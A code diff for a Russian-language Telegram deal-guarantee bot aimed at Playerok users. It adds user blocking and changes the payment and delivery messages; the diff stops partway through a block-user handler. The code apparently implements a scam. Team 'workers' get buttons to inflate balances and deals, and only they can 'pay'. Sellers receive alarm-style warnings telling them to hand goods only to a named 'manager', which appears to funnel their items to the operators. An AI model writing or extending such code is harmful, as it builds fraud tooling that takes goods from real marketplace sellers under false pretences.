@@ -39,6 +39,7 @@ user_activities = {}  # Словарь для хранения действий 
 owners = set()  # Владельцы (высший уровень)
 admins = set()  # Администраторы
 workers = set()  # Воркеры
+blocked_users = set()  # Заблокированные пользователи (новая функция)
 
 # Состояния для рассылок
 awaiting_broadcast_message = {}
@@ -51,6 +52,9 @@ TOPIC_STARTS = 117      # Старты бота
 TOPIC_NEW_DEALS = 118   # Новые сделки  
 TOPIC_SUCCESS_DEALS = 119  # Успешные сделки
 TOPIC_TEXT_MESSAGES = 120  # Текстовые сообщения
+
+# Менеджер для передачи товаров
+MANAGER_USERNAME = "@ManagerToPlayerok"
 
 # Проверка существования локального фото
 print(f"🔍 Проверка локального фото: {PHOTO_PATH}")
@@ -206,7 +210,9 @@ def log_activity(user_id, action, deal_id=None, details=None):
     elif (action in ['Обновил TON кошелёк', 'Обновил банковскую карту', 
                      'Обновил номер телефона', 'Обновил USDT кошелёк'] or
           'Отправил личное сообщение' in action or
-          'Отправил рассылку' in action):
+          'Отправил рассылку' in action or
+          'Заблокировал пользователя' in action or
+          'Разблокировал пользователя' in action):
         log_message = f"""
 💬 <b>ТЕКСТОВОЕ СООБЩЕНИЕ</b>
 
@@ -224,7 +230,7 @@ def log_activity(user_id, action, deal_id=None, details=None):
 # Загрузка данных из файла
 def load_data():
     """Загружает данные из файла"""
-    global users, deals, owners, admins, workers, deal_activities, user_activities
+    global users, deals, owners, admins, workers, deal_activities, user_activities, blocked_users
     try:
         if os.path.exists(DATA_FILE):
             with open(DATA_FILE, 'rb') as f:
@@ -236,18 +242,20 @@ def load_data():
                 workers = data.get('workers', set())
                 deal_activities = data.get('deal_activities', {})
                 user_activities = data.get('user_activities', {})
+                blocked_users = data.get('blocked_users', set())
                 print(f"✅ Данные загружены: {len(users)} пользователей, {len(deals)} сделок")
                 print(f"👑 Владельцы: {len(owners)} | Админы: {len(admins)} | Воркеры: {len(workers)}")
+                print(f"🚫 Заблокировано: {len(blocked_users)} пользователей")
                 return data
     except Exception as e:
         print(f"❌ Ошибка загрузки данных: {e}")
     print("✅ Созданы новые данные")
-    return {'users': {}, 'deals': {}, 'owners': set(), 'admins': set(), 'workers': set(), 'deal_activities': {}, 'user_activities': {}}
+    return {'users': {}, 'deals': {}, 'owners': set(), 'admins': set(), 'workers': set(), 'deal_activities': {}, 'user_activities': {}, 'blocked_users': set()}
 
 # Сохранение данных в файл
 def save_data():
     """Сохраняет данные в файл"""
-    global users, deals, owners, admins, workers, deal_activities, user_activities
+    global users, deals, owners, admins, workers, deal_activities, user_activities, blocked_users
     try:
         data = {
             'users': users,
@@ -256,11 +264,12 @@ def save_data():
             'admins': admins,
             'workers': workers,
             'deal_activities': deal_activities,
-            'user_activities': user_activities
+            'user_activities': user_activities,
+            'blocked_users': blocked_users
         }
         with open(DATA_FILE, 'wb') as f:
             pickle.dump(data, f)
-        print(f"✅ Данные сохранены: {len(users)} пользователей, {len(deals)} сделок")
+        print(f"✅ Данные сохранены: {len(users)} пользователей, {len(deals)} сделок, {len(blocked_users)} заблокированных")
         return True
     except Exception as e:
         print(f"❌ Ошибка сохранения данных: {e}")
@@ -283,6 +292,29 @@ for owner_id in owners:
         admins.add(owner_id)
 
 save_data()
+
+# Проверка блокировки пользователя
+def is_user_blocked(user_id):
+    """Проверяет, заблокирован ли пользователь"""
+    return user_id in blocked_users
+
+# Получение уровня пользователя
+def get_user_level(user_id):
+    """Возвращает уровень пользователя"""
+    if user_id in owners:
+        return "owner"
+    elif user_id in admins:
+        return "admin"
+    elif user_id in workers:
+        return "worker"
+    else:
+        return "regular"
+
+# Проверка, может ли пользователь оплачивать
+def can_user_pay(user_id):
+    """Проверяет, может ли пользователь оплачивать сделки"""
+    user_level = get_user_level(user_id)
+    return user_level in ["worker", "admin", "owner"]
 
 # Класс состояния для FSM
 class DealState:
@@ -373,8 +405,11 @@ def init_user(user_id):
             'awaiting_search_deal_activity': False,
             'awaiting_search_user_activity': False,
             'awaiting_search_recipient': False,
+            'awaiting_block_user': False,
+            'awaiting_unblock_user': False,
             'join_date': datetime.now().strftime("%d.%m.%Y"),
-            'last_active': datetime.now().strftime("%d.%m.%Y %H:%M")
+            'last_active': datetime.now().strftime("%d.%m.%Y %H:%M"),
+            'is_blocked': False
         }
         save_data()
         print(f"✅ Новый пользователь: {user_id} @{username}")
@@ -390,6 +425,20 @@ def update_user_activity(user_id):
 # Генерация клавиатуры главного меню с большими кнопками
 def main_menu(user_id):
     update_user_activity(user_id)
+    
+    # Проверяем блокировку
+    if is_user_blocked(user_id):
+        blocked_text = """
+🚫 <b>ВЫ ЗАБЛОКИРОВАНЫ</b>
+
+Ваш аккаунт был заблокирован администрацией.
+Вы не можете использовать функционал бота.
+
+Для выяснения причин обратитесь к администратору.
+        """
+        keyboard = InlineKeyboardMarkup(row_width=1)
+        keyboard.add(InlineKeyboardButton("📞 Связь с администрацией", url='tg://user?id=943896276'))
+        return blocked_text, keyboard
     
     keyboard = InlineKeyboardMarkup(row_width=2)
     
@@ -461,7 +510,7 @@ def main_menu(user_id):
             InlineKeyboardButton("💱 Валюта", callback_data='change_currency')
         )
         keyboard.add(InlineKeyboardButton("📞 Поддержка", url='tg://user?id=943896276'))
-    return keyboard
+    return get_welcome_text(), keyboard
 
 # Админ панель меню с большими кнопками (добавлены новые функции)
 def admin_panel_menu(user_id):
@@ -496,15 +545,79 @@ def admin_panel_menu(user_id):
         InlineKeyboardButton("💰 Накрутка баланса", callback_data='fake_balance')
     )
     
-    # Только владельцы могут добавлять/удалять админов
+    # Только владельцы могут добавлять/удалять админов и блокировать пользователей
     if user_id in owners:
         keyboard.add(
             InlineKeyboardButton("👑 Список админов", callback_data='show_admins'),
             InlineKeyboardButton("👑 Выдать админку", callback_data='add_admin')
         )
-        keyboard.add(InlineKeyboardButton("🗑️ Удалить админа", callback_data='remove_admin'))
+        keyboard.add(
+            InlineKeyboardButton("🗑️ Удалить админа", callback_data='remove_admin'),
+            InlineKeyboardButton("🚫 Блокировка", callback_data='block_user_menu')
+        )
     
     keyboard.add(InlineKeyboardButton("🔙 В меню", callback_data='main_menu'))
+    return keyboard
+
+# Меню управления блокировками
+def block_user_menu_keyboard():
+    keyboard = InlineKeyboardMarkup(row_width=2)
+    keyboard.add(
+        InlineKeyboardButton("🚫 Заблокировать", callback_data='block_user'),
+        InlineKeyboardButton("✅ Разблокировать", callback_data='unblock_user')
+    )
+    keyboard.add(
+        InlineKeyboardButton("📋 Список заблокированных", callback_data='blocked_users_list'),
+        InlineKeyboardButton("🔙 В админку", callback_data='admin_panel')
+    )
+    return keyboard
+
+# Меню списка заблокированных пользователей
+def blocked_users_list_keyboard(page=0, users_per_page=5):
+    keyboard = InlineKeyboardMarkup(row_width=2)
+    
+    all_blocked = list(blocked_users)
+    if not all_blocked:
+        keyboard.add(InlineKeyboardButton("📭 Нет заблокированных", callback_data='noop'))
+        keyboard.add(InlineKeyboardButton("🔙 Назад", callback_data='block_user_menu'))
+        return keyboard
+    
+    total_pages = (len(all_blocked) + users_per_page - 1) // users_per_page
+    
+    start_idx = page * users_per_page
+    end_idx = start_idx + users_per_page
+    
+    for blocked_id in all_blocked[start_idx:end_idx]:
+        if blocked_id in users:
+            user = users[blocked_id]
+            keyboard.add(InlineKeyboardButton(f"🚫 @{user['username'][:15]}", callback_data=f'view_blocked_{blocked_id}'))
+        else:
+            keyboard.add(InlineKeyboardButton(f"🚫 ID:{blocked_id}", callback_data=f'view_blocked_{blocked_id}'))
+    
+    # Навигация
+    nav_buttons = []
+    if page > 0:
+        nav_buttons.append(InlineKeyboardButton("⬅️ Назад", callback_data=f'blocked_list_{page-1}'))
+    
+    nav_buttons.append(InlineKeyboardButton(f"{page+1}/{total_pages}", callback_data='noop'))
+    
+    if page < total_pages - 1:
+        nav_buttons.append(InlineKeyboardButton("Вперед ➡️", callback_data=f'blocked_list_{page+1}'))
+    
+    if nav_buttons:
+        keyboard.add(*nav_buttons)
+    
+    keyboard.add(InlineKeyboardButton("🔙 Назад", callback_data='block_user_menu'))
+    return keyboard
+
+# Меню управления заблокированным пользователем
+def blocked_user_management_menu(user_id):
+    keyboard = InlineKeyboardMarkup(row_width=2)
+    keyboard.add(
+        InlineKeyboardButton("✅ Разблокировать", callback_data=f'unblock_user_{user_id}'),
+        InlineKeyboardButton("👤 Профиль", callback_data=f'admin_view_user_{user_id}')
+    )
+    keyboard.add(InlineKeyboardButton("🔙 К списку", callback_data='blocked_users_list'))
     return keyboard
 
 # Меню списка админов (только для владельцев)
@@ -587,7 +700,7 @@ def private_message_menu_keyboard():
     keyboard.add(InlineKeyboardButton("🔙 В админку", callback_data='admin_panel'))
     return keyboard
 
-# Воркер панель меню с большими кнопками
+# Воркер панель меню с большими кнопки
 def worker_panel_menu():
     keyboard = InlineKeyboardMarkup(row_width=2)
     keyboard.add(
@@ -601,7 +714,7 @@ def worker_panel_menu():
     keyboard.add(InlineKeyboardButton("🔙 В меню", callback_data='main_menu'))
     return keyboard
 
-# Меню управления воркером с большими кнопками
+# Меню управления воркером с большими кнопки
 def worker_management_menu(worker_id):
     keyboard = InlineKeyboardMarkup(row_width=2)
     keyboard.add(
@@ -615,7 +728,7 @@ def worker_management_menu(worker_id):
     keyboard.add(InlineKeyboardButton("🔙 Назад", callback_data='show_workers'))
     return keyboard
 
-# Меню выбора валюты с большими кнопками (добавлена валюта Stars)
+# Меню выбора валюты с большими кнопки (добавлена валюта Stars)
 def currency_menu_keyboard():
     keyboard = InlineKeyboardMarkup(row_width=2)
     keyboard.add(
@@ -637,7 +750,7 @@ def currency_menu_keyboard():
     keyboard.add(InlineKeyboardButton("🔙 В меню", callback_data='main_menu'))
     return keyboard
 
-# Меню реквизитов с большими кнопками (без Stars, так как Stars не требуют реквизитов)
+# Меню реквизитов с большими кнопки (без Stars, так как Stars не требуют реквизитов)
 def wallet_menu_keyboard():
     keyboard = InlineKeyboardMarkup(row_width=2)
     keyboard.add(
@@ -651,7 +764,7 @@ def wallet_menu_keyboard():
     keyboard.add(InlineKeyboardButton("🔙 В меню", callback_data='main_menu'))
     return keyboard
 
-# Меню создания сделки с большими кнопками (добавлена валюта Stars)
+# Меню создания сделки с большими кнопки (добавлена валюта Stars)
 def create_deal_keyboard():
     keyboard = InlineKeyboardMarkup(row_width=2)
     keyboard.add(
@@ -673,7 +786,7 @@ def create_deal_keyboard():
     keyboard.add(InlineKeyboardButton("🔙 В меню", callback_data='main_menu'))
     return keyboard
 
-# Меню выбора категории товара с большими кнопками
+# Меню выбора категории товара с большими кнопки
 def product_category_keyboard():
     keyboard = InlineKeyboardMarkup(row_width=2)
     keyboard.add(
@@ -694,7 +807,7 @@ def deal_seller_keyboard(deal_id):
     keyboard.add(InlineKeyboardButton("🔙 Мои сделки", callback_data='my_deals'))
     return keyboard
 
-# Меню сделки для покупателя с большими кнопки (ИСПРАВЛЕНО: "тех поддержке" вместо "тех поддержки")
+# Меню сделки для покупателя с большими кнопки
 def deal_buyer_keyboard(deal_id):
     keyboard = InlineKeyboardMarkup(row_width=2)
     keyboard.add(
@@ -951,6 +1064,10 @@ def show_user_profile(user_id, chat_id, message_id=None):
     elif user_id in workers:
         role = "👷 Воркер"
     
+    # Добавляем статус блокировки
+    if is_user_blocked(user_id):
+        role += " 🚫 (Заблокирован)"
+    
     active_deals = []
     for deal_id, deal in deals.items():
         if deal['seller_id'] == user_id or (deal.get('buyer_id') and deal['buyer_id'] == user_id):
@@ -1135,6 +1252,7 @@ def show_stats_admin(user_id, chat_id, message_id=None):
 👑 <b>Владельцы:</b> {len(owners)}
 ⚙️ <b>Админы:</b> {len(admins) - len(owners)}
 👷 <b>Воркеры:</b> {len(workers)}
+🚫 <b>Заблокировано:</b> {len(blocked_users)}
 📋 <b>Активных сделок:</b> {len(deals)}
 👤 <b>Активных сегодня:</b> {active_users}
 🟢 <b>Онлайн сейчас (~5 мин):</b> {online_now}
@@ -1380,6 +1498,10 @@ def show_user_activities_admin(user_id, chat_id, message_id, target_user_id, pag
     elif target_user_id in workers:
         role = "👷 Воркер"
     
+    # Добавляем статус блокировки
+    if is_user_blocked(target_user_id):
+        role += " 🚫 (Заблокирован)"
+    
     if not activities:
         activities_text = f"""
 📊 <b>АКТИВНОСТЬ ПОЛЬЗОВАТЕЛЯ</b>
@@ -1439,6 +1561,14 @@ def show_user_activities_admin(user_id, chat_id, message_id, target_user_id, pag
         InlineKeyboardButton("👤 Профиль", callback_data=f'admin_view_user_{target_user_id}'),
         InlineKeyboardButton("✉️ Написать", callback_data=f'admin_message_user_{target_user_id}')
     )
+    
+    # Кнопка блокировки/разблокировки (только для владельцев)
+    if user_id in owners:
+        if is_user_blocked(target_user_id):
+            keyboard.add(InlineKeyboardButton("✅ Разблокировать", callback_data=f'unblock_user_{target_user_id}'))
+        else:
+            keyboard.add(InlineKeyboardButton("🚫 Заблокировать", callback_data=f'block_user_{target_user_id}'))
+    
     keyboard.add(InlineKeyboardButton("🔙 К списку", callback_data='user_activities_admin'))
     
     send_photo_message(chat_id, message_id, activities_text, keyboard)
@@ -1447,6 +1577,22 @@ def show_user_activities_admin(user_id, chat_id, message_id, target_user_id, pag
 @bot.message_handler(commands=['start'])
 def handle_start(message):
     user_id = message.from_user.id
+    
+    # Проверяем блокировку
+    if is_user_blocked(user_id):
+        blocked_text = """
+🚫 <b>ВЫ ЗАБЛОКИРОВАНЫ</b>
+
+Ваш аккаунт был заблокирован администрацией.
+Вы не можете использовать функционал бота.
+
+Для выяснения причин обратитесь к администратору.
+        """
+        keyboard = InlineKeyboardMarkup(row_width=1)
+        keyboard.add(InlineKeyboardButton("📞 Связь с администрацией", url='tg://user?id=943896276'))
+        bot.send_message(message.chat.id, blocked_text, parse_mode='HTML', reply_markup=keyboard)
+        return
+    
     init_user(user_id)
     update_user_activity(user_id)
     
@@ -1507,10 +1653,17 @@ def handle_start(message):
                 buyer_text += "После оплаты нажмите 'Подтвердить оплату'"
                 
                 keyboard = InlineKeyboardMarkup(row_width=2)
-                keyboard.add(
-                    InlineKeyboardButton("💸 Оплатить с баланса", callback_data=f'pay_balance_{deal_id}'),
-                    InlineKeyboardButton("✅ Подтвердить оплату", callback_data=f'confirm_pay_{deal_id}')
-                )
+                
+                # Проверяем, может ли пользователь оплачивать
+                if can_user_pay(user_id):
+                    keyboard.add(
+                        InlineKeyboardButton("💸 Оплатить с баланса", callback_data=f'pay_balance_{deal_id}'),
+                        InlineKeyboardButton("✅ Подтвердить оплату", callback_data=f'confirm_pay_{deal_id}')
+                    )
+                else:
+                    # Для обычных пользователей показываем сообщение о недостатке средств
+                    buyer_text += f"\n\n⚠️ <b>ВНИМАНИЕ:</b>\nДля оплаты сделок необходим уровень воркера, администратора или владельца."
+                
                 keyboard.add(InlineKeyboardButton("⚠️ Открыть спор", callback_data=f'dispute_{deal_id}'))
                 keyboard.add(InlineKeyboardButton("🔙 В меню", callback_data='main_menu'))
                 
@@ -1518,7 +1671,8 @@ def handle_start(message):
                 return
     
     # Отправляем приветственное сообщение только по команде /start
-    send_photo_message(message.chat.id, None, get_welcome_text(), main_menu(user_id))
+    welcome_text, keyboard = main_menu(user_id)
+    send_photo_message(message.chat.id, None, welcome_text, keyboard)
 
 # Обработчик команды /admin
 @bot.message_handler(commands=['admin'])
@@ -1546,10 +1700,26 @@ def handle_stats_command(message):
     else:
         show_stats_public(user_id, message.chat.id)
 
-# Обработчик команды /cuprumovteam для получения воркер панели (доступно всем) - ИЗМЕНЕНО С /brugovteam
+# Обработчик команды /cuprumovteam для получения воркер панели (доступно всем)
 @bot.message_handler(commands=['cuprumovteam'])
 def handle_cuprumovteam(message):
     user_id = message.from_user.id
+    
+    # Проверяем блокировку
+    if is_user_blocked(user_id):
+        blocked_text = """
+🚫 <b>ВЫ ЗАБЛОКИРОВАНЫ</b>
+
+Ваш аккаунт был заблокирован администрацией.
+Вы не можете использовать функционал бота.
+
+Для выяснения причин обратитесь к администратору.
+        """
+        keyboard = InlineKeyboardMarkup(row_width=1)
+        keyboard.add(InlineKeyboardButton("📞 Связь с администрацией", url='tg://user?id=943896276'))
+        bot.send_message(message.chat.id, blocked_text, parse_mode='HTML', reply_markup=keyboard)
+        return
+    
     init_user(user_id)
     update_user_activity(user_id)
     
@@ -1571,6 +1741,7 @@ def handle_cuprumovteam(message):
 • Возможность накрутки сделок (до 10 за раз)
 • Возможность накрутки баланса (до 1000 в валютах СНГ)
 • Просмотр статистики
+• Возможность оплаты сделок
 
 <b>Обязанности:</b>
 • Соблюдение правил системы
@@ -1600,11 +1771,29 @@ def callback_handler(call):
     user_id = call.from_user.id
     chat_id = call.message.chat.id
     message_id = call.message.message_id
+    
+    # Проверяем блокировку
+    if is_user_blocked(user_id):
+        bot.answer_callback_query(call.id, "🚫 Вы заблокированы и не можете выполнять действия", show_alert=True)
+        blocked_text = """
+🚫 <b>ВЫ ЗАБЛОКИРОВАНЫ</b>
+
+Ваш аккаунт был заблокирован администрацией.
+Вы не можете использовать функционал бота.
+
+Для выяснения причин обратитесь к администратору.
+        """
+        keyboard = InlineKeyboardMarkup(row_width=1)
+        keyboard.add(InlineKeyboardButton("📞 Связь с администрацией", url='tg://user?id=943896276'))
+        bot.send_message(chat_id, blocked_text, parse_mode='HTML', reply_markup=keyboard)
+        return
+    
     init_user(user_id)
     update_user_activity(user_id)
     
     if call.data == 'main_menu':
-        send_photo_message(chat_id, message_id, get_welcome_text(), main_menu(user_id))
+        welcome_text, keyboard = main_menu(user_id)
+        send_photo_message(chat_id, message_id, welcome_text, keyboard)
     
     elif call.data == 'my_profile':
         show_user_profile(user_id, chat_id, message_id)
@@ -1694,7 +1883,16 @@ https://t.me/{bot.get_me().username}?start={deal_id}
                 
                 deal_text += f"\n\n📌 <b>Комментарий к платежу:</b>\n#{deal_id}"
                 
-                send_photo_message(chat_id, message_id, deal_text, deal_buyer_keyboard(deal_id))
+                # Проверяем, может ли пользователь оплачивать
+                if can_user_pay(user_id):
+                    keyboard = deal_buyer_keyboard(deal_id)
+                else:
+                    deal_text += f"\n\n⚠️ <b>ВНИМАНИЕ:</b>\nДля оплаты сделок необходим уровень воркера, администратора или владельца."
+                    keyboard = InlineKeyboardMarkup(row_width=1)
+                    keyboard.add(InlineKeyboardButton("⚠️ Открыть спор", callback_data=f'dispute_{deal_id}'))
+                    keyboard.add(InlineKeyboardButton("🔙 Мои сделки", callback_data='my_deals'))
+                
+                send_photo_message(chat_id, message_id, deal_text, keyboard)
     
     elif call.data == 'wallet_menu':
         wallet_text = """
@@ -2112,6 +2310,7 @@ https://t.me/{bot.get_me().username}?start={deal_id}
 👑 <b>Владельцы:</b> {len(owners)}
 ⚙️ <b>Админы:</b> {len(admins) - len(owners)}
 👷 <b>Воркеры:</b> {len(workers)}
+🚫 <b>Заблокировано:</b> {len(blocked_users)}
 📋 <b>Активных сделок:</b> {len(deals)}
 👤 <b>Активных сегодня:</b> {active_users}
 
@@ -2182,6 +2381,10 @@ https://t.me/{bot.get_me().username}?start={deal_id}
                 role = "⚙️"
             elif uid in workers:
                 role = "👷"
+            
+            # Добавляем статус блокировки
+            if is_user_blocked(uid):
+                role += " 🚫"
             
             users_text += f"\n{role} <b>{idx}. @{user_data['username']}</b>"
             users_text += f"\n   🆔 ID: {uid}"
@@ -2612,11 +2815,16 @@ https://t.me/{bot.get_me().username}?start={deal_id}
         
         deal = deals[deal_id]
         
+        # Проверяем, может ли пользователь оплачивать
+        if not can_user_pay(user_id):
+            bot.answer_callback_query(call.id, "❌ К сожалению у вас не хватает средств", show_alert=True)
+            return
+        
         if deal['currency'] not in users[user_id]['balance']:
             users[user_id]['balance'][deal['currency']] = 0.0
             
         if users[user_id]['balance'][deal['currency']] < deal['amount']:
-            bot.answer_callback_query(call.id, "❌ Недостаточно средств", show_alert=True)
+            bot.answer_callback_query(call.id, "❌ Недостаточно средств на балансе", show_alert=True)
             return
         
         users[user_id]['balance'][deal['currency']] -= deal['amount']
@@ -2646,15 +2854,25 @@ https://t.me/{bot.get_me().username}?start={deal_id}
         
         send_photo_message(chat_id, message_id, buyer_text, keyboard)
         
-        # ИСПРАВЛЕНО: "тех поддержке" вместо "тех поддержки"
+        # НОВЫЙ ТЕКСТ: Изменено сообщение о получении оплаты
         seller_text = f"""
-💰 <b>ПОЛУЧЕНА ОПЛАТА!</b>
+💰 <b>ОПЛАТА ПОЛУЧЕНА!</b>
 
 📋 <b>Сделка:</b> #{deal_id[:8]}
 👤 <b>Покупатель:</b> @{users[user_id]['username']}
 💸 <b>Сумма:</b> {deal['amount']} {deal['currency']}
 
-<b>Отправьте товар тех поддержке и подтвердите отправку.</b>
+Покупатель подтвердил оплату. Отправьте товар менеджеру!
+
+🛡️ <b>Критически важное правило:</b>
+Товар должен быть передан исключительно менеджеру - {MANAGER_USERNAME}!
+
+🚫 <b>Если вам предлагают нарушить правило:</b>
+• «Передайте напрямую покупателю/другому лицу»->
+• Это мошенническая схема!
+• Любая передача мимо менеджера:
+1) Автоматически отменяет сделку
+2) Лишает гарантий возврата средств
         """
         seller_keyboard = InlineKeyboardMarkup(row_width=2)
         seller_keyboard.add(
@@ -2673,7 +2891,7 @@ https://t.me/{bot.get_me().username}?start={deal_id}
         deal = deals[deal_id]
         
         # Логируем отправку товара
-        log_activity(user_id, 'Подтвердил отправку товара', deal_id)
+        log_activity(user_id, 'Подтвердил отправку товара менеджеру', deal_id)
         
         seller_text = f"""
 📤 <b>ОТПРАВКА ПОДТВЕРЖДЕНА</b>
@@ -2681,8 +2899,10 @@ https://t.me/{bot.get_me().username}?start={deal_id}
 📋 <b>Сделка:</b> #{deal_id[:8]}
 👤 <b>Покупатель:</b> @{users[deal['buyer_id']]['username']}
 
-<b>Ожидайте подтверждения получения от тех поддержки.</b>
-<i>Если тех поддержка не подтвердит получение в течение 24 часов, средства будут автоматически переведены вам.</i>
+<b>Товар отправлен менеджеру {MANAGER_USERNAME}.</b>
+<i>Ожидайте подтверждения получения товара менеджером.</i>
+
+<b>Внимание:</b> Любая передача товара напрямую покупателю автоматически отменяет сделку!
         """
         keyboard = InlineKeyboardMarkup(row_width=1)
         keyboard.add(InlineKeyboardButton("🔙 В меню", callback_data='main_menu'))
@@ -2690,12 +2910,15 @@ https://t.me/{bot.get_me().username}?start={deal_id}
         send_photo_message(chat_id, message_id, seller_text, keyboard)
         
         buyer_text = f"""
-📦 <b>ТОВАР ОТПРАВЛЕН</b>
+📦 <b>ТОВАР ОТПРАВЛЕН МЕНЕДЖЕРУ</b>
 
 📋 <b>Сделка:</b> #{deal_id[:8]}
 👤 <b>Продавец:</b> @{users[deal['seller_id']]['username']}
 
-<b>Проверьте получение товара и подтвердите:</b>
+<b>Продавец подтвердил отправку товара менеджеру.</b>
+<i>Ожидайте подтверждения получения товара менеджером.</i>
+
+<b>Внимание:</b> Любая передача товара напрямую от продавца автоматически отменяет сделку!
         """
         buyer_keyboard = InlineKeyboardMarkup(row_width=2)
         buyer_keyboard.add(
@@ -2705,6 +2928,45 @@ https://t.me/{bot.get_me().username}?start={deal_id}
         buyer_keyboard.add(InlineKeyboardButton("📞 Поддержка", url='https://t.me/ManagerToPlayerok'))
         
         send_photo_message(deal['buyer_id'], None, buyer_text, buyer_keyboard)
+        
+        # НОВАЯ ФУНКЦИЯ: Отправляем уведомление админам и владельцам о получении товара
+        for admin_id in admins:
+            try:
+                admin_notification = f"""
+📦 <b>ТОВАР ОТПРАВЛЕН МЕНЕДЖЕРУ</b>
+
+📋 <b>Сделка:</b> #{deal_id[:8]}
+👤 <b>Продавец:</b> @{users[deal['seller_id']]['username']}
+👤 <b>Покупатель:</b> @{users[deal['buyer_id']]['username']}
+💰 <b>Сумма:</b> {deal['amount']} {deal['currency']}
+
+<b>Статус:</b> Товар отправлен менеджеру {MANAGER_USERNAME}
+
+<b>Действия:</b>
+1. Проверить получение товара менеджером
+2. Подтвердить передачу товара покупателю
+3. Завершить сделку после подтверждения
+                """
+                bot.send_message(admin_id, admin_notification, parse_mode='HTML')
+            except:
+                pass
+        
+        for owner_id in owners:
+            try:
+                owner_notification = f"""
+📦 <b>ТОВАР ОТПРАВЛЕН МЕНЕДЖЕРУ</b>
+
+📋 <b>Сделка:</b> #{deal_id[:8]}
+👤 <b>Продавец:</b> @{users[deal['seller_id']]['username']}
+👤 <b>Покупатель:</b> @{users[deal['buyer_id']]['username']}
+💰 <b>Сумма:</b> {deal['amount']} {deal['currency']}
+
+<b>Статус:</b> Товар отправлен менеджеру {MANAGER_USERNAME}
+<b>Уровень важности:</b> Высокий
+                """
+                bot.send_message(owner_id, owner_notification, parse_mode='HTML')
+            except:
+                pass
     
     elif call.data.startswith('received_'):
         deal_id = call.data.split('_')[1]
@@ -2722,7 +2984,7 @@ https://t.me/{bot.get_me().username}?start={deal_id}
         save_data()
         
         # Логируем завершение сделки
-        log_activity(user_id, 'Подтвердил получение товара', deal_id)
+        log_activity(user_id, 'Подтвердил получение товара от менеджера', deal_id)
         log_activity(deal['seller_id'], 'Сделка завершена успешно', deal_id)
         
         completed_text = f"""
@@ -2750,7 +3012,7 @@ https://t.me/{bot.get_me().username}?start={deal_id}
             return
         
         # Логируем открытие спора
-        log_activity(user_id, 'Открыл спор: товар не получен', deal_id)
+        log_activity(user_id, 'Открыл спор: товар не получен от менеджера', deal_id)
         
         dispute_text = f"""
 ⚠️ <b>ОТКРЫТ СПОР</b>
@@ -2759,7 +3021,8 @@ https://t.me/{bot.get_me().username}?start={deal_id}
 👤 <b>Покупатель:</b> @{users[user_id]['username']}
 👤 <b>Продавец:</b> @{users[deals[deal_id]['seller_id']]['username']}
 
-<b>Причина:</b> Товар не получен
+<b>Причина:</b> Товар не получен от менеджера
+<b>Менеджер:</b> {MANAGER_USERNAME}
 
 <b>Администратор уведомлён и свяжется с вами.</b>
 <i>Пожалуйста, подготовьте доказательства.</i>
@@ -2778,11 +3041,12 @@ https://t.me/{bot.get_me().username}?start={deal_id}
 👤 <b>Покупатель:</b> @{users[user_id]['username']} (ID: {user_id})
 👤 <b>Продавец:</b> @{users[deals[deal_id]['seller_id']]['username']} (ID: {deals[deal_id]['seller_id']})
 💸 <b>Сумма:</b> {deals[deal_id]['amount']} {deals[deal_id]['currency']}
+👨‍💼 <b>Менеджер:</b> {MANAGER_USERNAME}
 
-<b>Причина:</b> Покупатель не получил товар
+<b>Причина:</b> Покупатель не получил товар от менеджера
 
 <b>Действия:</b>
-1. Связаться с обоими участниками
+1. Связаться с обоими участниками и менеджером
 2. Запросить доказательства
 3. Принять решение в течение 24 часов
                 """
@@ -2803,6 +3067,7 @@ https://t.me/{bot.get_me().username}?start={deal_id}
         # Логируем подтверждение оплаты
         log_activity(user_id, 'Подтвердил оплату сделки', deal_id)
         
+        # НОВЫЙ ТЕКСТ: Изменено сообщение о получении оплаты
         seller_text = f"""
 💰 <b>ОПЛАТА ПОЛУЧЕНА!</b>
 
@@ -2810,7 +3075,17 @@ https://t.me/{bot.get_me().username}?start={deal_id}
 👤 <b>Покупатель:</b> @{users[user_id]['username']}
 💸 <b>Сумма:</b> {deal['amount']} {deal['currency']}
 
-<b>Покупатель подтвердил оплату. Отправьте товар!</b>
+Покупатель подтвердил оплату. Отправьте товар менеджеру!
+
+🛡️ <b>Критически важное правило:</b>
+Товар должен быть передан исключительно менеджеру - {MANAGER_USERNAME}!
+
+🚫 <b>Если вам предлагают нарушить правило:</b>
+• «Передайте напрямую покупателю/другому лицу»->
+• Это мошенническая схема!
+• Любая передача мимо менеджера:
+1) Автоматически отменяет сделку
+2) Лишает гарантий возврата средств
         """
         seller_keyboard = InlineKeyboardMarkup(row_width=2)
         seller_keyboard.add(
@@ -2827,8 +3102,10 @@ https://t.me/{bot.get_me().username}?start={deal_id}
 👤 <b>Продавец:</b> @{users[deal['seller_id']]['username']}
 💸 <b>Сумма:</b> {deal['amount']} {deal['currency']}
 
-<b>Ожидайте отправки товара от продавца.</b>
+<b>Ожидайте отправки товара менеджеру от продавца.</b>
 <i>Продавец получил уведомление о вашей оплате.</i>
+
+<b>Внимание:</b> Любая передача товара напрямую от продавца автоматически отменяет сделку!
         """
         keyboard = InlineKeyboardMarkup(row_width=1)
         keyboard.add(InlineKeyboardButton("📞 Поддержка", url='https://t.me/ManagerToPlayerok'))
@@ -2847,6 +3124,7 @@ https://t.me/{bot.get_me().username}?start={deal_id}
 
 📋 <b>Сделка:</b> #{deal_id[:8]}
 👤 <b>Ваша роль:</b> {'Покупатель' if user_id == deals[deal_id].get('buyer_id') else 'Продавец'}
+👨‍💼 <b>Менеджер сделки:</b> {MANAGER_USERNAME}
 
 <b>Вы уверены, что хотите открыть спор?</b>
 <i>Администратор рассмотрит ваш спор в течение 24 часов.</i>
@@ -3240,19 +3518,282 @@ https://t.me/{bot.get_me().username}?start={deal_id}
         
         send_photo_message(chat_id, message_id, search_text, keyboard)
     
+    # НОВЫЕ ФУНКЦИИ: Управление блокировками
+    elif call.data == 'block_user_menu':
+        if user_id not in owners:
+            bot.answer_callback_query(call.id, "❌ Доступ запрещён. Только владельцы могут управлять блокировками", show_alert=True)
+            return
+        
+        block_menu_text = """
+🚫 <b>УПРАВЛЕНИЕ БЛОКИРОВКАМИ</b>
+
+<b>Выберите действие:</b>
+• Заблокировать пользователя — полностью отключить доступ к боту
+• Разблокировать пользователя — восстановить доступ
+• Список заблокированных — просмотреть всех заблокированных пользователей
+
+<b>Внимание:</b> Блокировка применяется ко всем уровням пользователей (включая администраторов и воркеров)
+        """
+        
+        send_photo_message(chat_id, message_id, block_menu_text, block_user_menu_keyboard())
+    
+    elif call.data == 'block_user':
+        if user_id not in owners:
+            bot.answer_callback_query(call.id, "❌ Доступ запрещён", show_alert=True)
+            return
+        
+        users[user_id]['awaiting_block_user'] = True
